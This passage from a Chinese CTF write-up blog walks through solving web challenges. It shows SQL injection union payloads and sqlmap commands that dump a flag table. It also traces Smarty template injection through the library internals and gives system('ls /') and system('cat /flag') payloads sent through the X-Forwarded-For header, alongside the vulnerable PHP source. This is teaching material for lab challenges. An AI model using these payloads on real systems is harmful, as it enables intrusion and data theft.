      <p>方法和查询表名类似，需要提供表名，之前查表名的原因</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span><span class="operator">-</span>xx<span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181822291.png" alt="image-20230110181822291"></p>

        <h2 id="7-查询数据"   >
          <a href="#7-查询数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-查询数据" class="headerlink" title="7.查询数据"></a>7.查询数据</h2>
      <p>方法类似，查询<code>flag</code>内容</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,group_concat(flag),3 from test_tb--+ </span></span><br></pre></td></tr></table></div></figure>

<p>得到最终<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110182041851.png" alt="image-20230110182041851"></p>

        <h2 id="SQLMAP"   >
          <a href="#SQLMAP" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2>
      <figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -dbs</span><br><span class="line"><span class="meta">#</span><span class="bash">得到所有数据库名</span></span><br><span class="line"></span><br><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -D test_db --tables</span><br><span class="line"><span class="meta">#</span><span class="bash">得到库test_db中的所有表名字</span></span><br><span class="line"></span><br><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -D test_db -T test_db --columns</span><br><span class="line"><span class="meta">#</span><span class="bash">得到库test_db中test_db表中的所有字段名字，这个跑不出来</span></span><br><span class="line"></span><br><span class="line">python .\sqlmap.py -u &quot;http://1.14.71.254:28374/?wllm=1&quot; -D test_db -T test_db -C flag -dump</span><br><span class="line"><span class="meta">#</span><span class="bash">跑不出来</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="CISCN-2019华东南-Web11"   >
          <a href="#CISCN-2019华东南-Web11" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN-2019华东南-Web11" class="headerlink" title="[CISCN 2019华东南]Web11"></a>[CISCN 2019华东南]Web11</h1>
      <p>看到这两个，猜测是<code>smarty</code>的<code>Server Side Template Injection</code>即<code>SSTI</code>模板注入，这个就需要一些前置知识了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111154621041.png" alt="image-20230111154621041"></p>

        <h2 id="前置知识-1"   >
          <a href="#前置知识-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>简单安装使用：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/enjoyxp/article/details/2050325" >(48条消息) windows环境下smarty安装最简明教程_enjoyxp的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/272393#h3-12" >Smarty 模板注入与沙箱逃逸-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>首先应该是为什说<code>smarty</code>能够进行模板注入，其实主要在于它的<code>string</code>模板，也就是如下的代码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&#123;phpinfo()&#125;&quot;</span>);</span><br></pre></td></tr></table></div></figure>


        <h3 id="前期调用链"   >
          <a href="#前期调用链" class="heading-link"><i class="fas fa-link"></i></a><a href="#前期调用链" class="headerlink" title="前期调用链"></a>前期调用链</h3>
      <p>前期会有一些链子调用到关键函数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">display</span><br><span class="line">Smarty_Internal_TemplateBase._execute</span><br><span class="line"></span><br><span class="line">Smarty_Internal_Template.render</span><br><span class="line">//这里会进行模板是否存在的检测，不存在就直接返回了，这里的模板指的是`string:&#123;phpinfo()&#125;`中的`string`，然后就会进行模板的一些处理</span><br><span class="line"></span><br><span class="line">Smarty_Template_Compiled.render</span><br><span class="line">//这里也会进行模板检测，不太清楚和前面有啥区别</span><br><span class="line"></span><br><span class="line">Smarty_Template_Compiled.process</span><br><span class="line">//这个函数比较关键，后续基本都是从这里展开的</span><br></pre></td></tr></table></div></figure>


        <h3 id="模板创建"   >
          <a href="#模板创建" class="heading-link"><i class="fas fa-link"></i></a><a href="#模板创建" class="headerlink" title="模板创建"></a>模板创建</h3>
      <p>当最开始没有进行该模板创建时，会创建模板，在前期调用链中还有后续的一些链子</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Smarty_Template_Compiled.compileTemplateSource</span><br><span class="line">//创建</span><br><span class="line">Smarty_Template_Compiled.loadCompiledTemplate</span><br><span class="line">//创建完成之后加载调用</span><br></pre></td></tr></table></div></figure>

<p>下面分析更多</p>
<p>调用到<code>Smarty_Template_Compiled.compileTemplateSource</code>函数，然后在<code>write</code>函数中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164052011.png" alt="image-20230111164052011"></p>
<p>回调到<code>Smarty_Internal_TemplateCompilerBase.compileTemplate</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164116060.png" alt="image-20230111164116060"></p>
<p>里面调用<code>create</code>函数再回调到<code>Smarty_Internal_TemplateCompilerBase.compileTemplateSource</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164320942.png" alt="image-20230111164320942"></p>
<p>该函数最终会调用<code>getContent</code>函数，依据不同的<code>handler</code>调用到不同类的处理函数中，比如<code>string</code>对应的类就是<code>Smarty_Internal_Resource_String</code>，会调用到其<code>decode</code>函数进行相关内容处理</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164515198.png" alt="image-20230111164515198"></p>
<p>比如这里的这里提到的例子里面的<code>string</code>就是<code>&#123;phpinfo()&#125;</code>，相关处理后就直接返回内容，然后在后续的操作中，将该内容连同一些数据写入到指定的<code>templates_c</code>文件夹中<code>hash</code>之后的一个<code>php</code>文件，这里就会如下结果</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Smarty version 4.3.0, created on 2023-01-11 16:48:16</span></span><br><span class="line"><span class="comment">  from &#x27;ce7370c7e6956f1e6a18ad78cf4f6e48dabb61b3&#x27; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> Smarty_Internal_Template $_smarty_tpl */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_smarty_tpl</span>-&gt;_decodeProperties(<span class="variable">$_smarty_tpl</span>, <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;version&#x27;</span> =&gt; <span class="string">&#x27;4.3.0&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;unifunc&#x27;</span> =&gt; <span class="string">&#x27;content_63be77d0cad990_36655883&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;has_nocache_code&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&#x27;file_dependency&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">  ),</span><br><span class="line">  <span class="string">&#x27;includes&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">  ),</span><br><span class="line">),<span class="literal">false</span>)) &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">content_63be77d0cad990_36655883</span> (<span class="params">Smarty_Internal_Template <span class="variable">$_smarty_tpl</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后在后续的<code>Smarty_Template_Compiled.loadCompiledTemplate</code>中会对该文件进行包含，执行其中的<code>php</code>代码，这里可能是因为<code>smarty</code>一些机制原因，必定在包含的时候能够执行到里面对应的那个函数。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111165045717.png" alt="image-20230111165045717"></p>

        <h3 id="模板调用"   >
          <a href="#模板调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#模板调用" class="headerlink" title="模板调用"></a>模板调用</h3>
      <p>当存在该模板，也就是<code>string:&#123;phpinfo()&#125;</code>对应的模板，就会在<code>Smarty_Template_Compiled.process</code>函数中，也就是如下红框中，直接进行对应的模板文件包含，同样也是可以执行代码的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111171930724.png" alt="image-20230111171930724"></p>

        <h3 id="其他类模板"   >
          <a href="#其他类模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他类模板" class="headerlink" title="其他类模板"></a>其他类模板</h3>
      <p>前面提到的是<code>string</code>类的模板，同样也可能会有自定义的，比如如下</p>
<p>参考：[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" >CVE-2017-1000480]Smarty &lt;= 3.1.32 php代码执行 漏洞分析 | Chybeta</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">Smarty_Resource_Custom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$name</span>,&amp;<span class="variable">$source</span>,&amp;<span class="variable">$mtime</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$source</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$mtime</span> = time();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;test:&#123;phpinfo()&#125;&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>$name</code>就是对应的<code>&#123;phpinfo()&#125;</code>，将其赋值给<code>$source</code>从而在后续的<code>smarty</code>处理中形成对应的<code>content</code>，因为在<code>write</code>过程中之前提到会有<code>getContent</code>的调用，使用自定义类<code>Smarty_Resource_Custom</code>就会调用到该类的<code>fetch</code>函数，传入的<code>source</code>就是<code>content</code>，从而为<code>content</code>赋值。</p>

        <h2 id="漏洞形式"   >
          <a href="#漏洞形式" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h2>
      <p>常见的漏洞形式如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span>.<span class="variable">$data</span>);</span><br></pre></td></tr></table></div></figure>

<p>这样<code>data</code>就是可控的，那么相关的代码执行就是水到渠成了。</p>

        <h2 id="题目"   >
          <a href="#题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目" class="headerlink" title="题目"></a>题目</h2>
      <p>相对于这道题就可以猜测了，大概就是会接收我们的<code>ip</code>，然后和它的模板进行拼接然后输出，其实测试一下就可以了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111174624907.png" alt="image-20230111174624907"></p>
<p>很明显，可以代码执行，即可完成</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(&#x27;ls /&#x27;)&#125;</span><br><span class="line">&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></div></figure>

<p>具体看看代码，放个木马上去下载一下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;smarty/libs/Smarty.class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;debugging = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;caching = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;assign(<span class="string">&#x27;foo&#x27;</span>,<span class="string">&#x27;value&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]))&#123;</span><br><span class="line">           <span class="variable">$real_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>])) &#123;</span><br><span class="line">           <span class="variable">$real_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$real_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(getenv(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>))&#123;</span><br><span class="line">              <span class="variable">$real_ip</span> = getenv( <span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(getenv(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>)) &#123;</span><br><span class="line">              <span class="variable">$real_ip</span> = getenv(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="variable">$real_ip</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$template_string</span> = <span class="string">&#x27;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;A Simple IP Address API&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;float:left;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;IP&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h2 class=&quot;hidden-xs hidden-sm&quot;&gt;A Simple Public IP Address API&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">		&lt;div style=&quot;float:right;margin-top:30px;&quot;&gt;Current IP:&#x27;</span>.<span class="variable">$real_ip</span>.<span class="string">&#x27;		&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;why row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-xs-12&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;Why use?&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;col-xs-offset-1 col-xs-10&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;p&gt;</span></span><br><span class="line"><span class="string">                        Do you need to get the public IP address ? Do you have the requirements to obtain the servers’ public IP address? Whatever the reason,sometimes a public IP address API are useful.</span></span><br><span class="line"><span class="string">                    &lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;p&gt;</span></span><br><span class="line"><span class="string">                        You should use this because:</span></span><br><span class="line"><span class="string">                    &lt;/p&gt;&lt;ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;You can initiate requests without any limit.&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;li&gt;Does not record the visitor information.&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;p&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;api row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-xs-12&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;API Usage&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;col-xs-offset-1 col-xs-11&quot;&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;table-responsive&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;table class=&quot;table table-striped table-bordered table-hover&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;thead&gt;</span></span><br><span class="line"><span class="string">                            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;-&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;API URI&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td width=&quot;50px&quot;&gt;Type&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;Sample Output&lt;/td&gt;</span></span><br><span class="line"><span class="string">                            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;/thead&gt;</span></span><br><span class="line"><span class="string">                            &lt;tbody&gt;</span></span><br><span class="line"><span class="string">                            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;get IP&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>].<span class="string">&#x27;api&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;text/html&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;8.8.8.8&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;get XFF(X-Forwarded-For)&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;http://&#x27;</span> .<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>].<span class="string">&#x27;xff&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;text/html&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;8.8.8.8&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                            </span></span><br><span class="line"><span class="string">                            </span></span><br><span class="line"><span class="string">                            &lt;/tbody&gt;</span></span><br><span class="line"><span class="string">                        &lt;/table&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;examples row&quot;&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-xs-12&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2 style=&quot;margin-bottom:0;&quot;&gt;Connection&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;col-xs-offset-1 col-xs-10&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;h3&gt;Request-Header&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                    &lt;pre&gt;GET / HTTP/2.0</span></span><br><span class="line"><span class="string">Host: www.ip.la</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Dnt: 1</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;footer&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;text-align:center;font-size:14px;&quot;&gt;Build With Smarty !&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/footer&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;string:&#x27;</span>.<span class="variable">$template_string</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>可以看到<code>$template_string</code>中包含了我们可以控制的<code>$real_ip</code></p>

        <h1 id="NISACTF-2022-midlevel"   >
          <a href="#NISACTF-2022-midlevel" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-midlevel" class="headerlink" title="[NISACTF 2022]midlevel"></a>[NISACTF 2022]midlevel</h1>
      <p>和上一道题一模一样，不太懂意义在哪里</p>

        <h1 id="NISACTF-2022-is-secret"   >
          <a href="#NISACTF-2022-is-secret" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-is-secret" class="headerlink" title="[NISACTF 2022]is secret"></a>[NISACTF 2022]is secret</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155550917.png" alt="image-20230112155550917"></p>
<p>试试输入<code>secret</code></p>
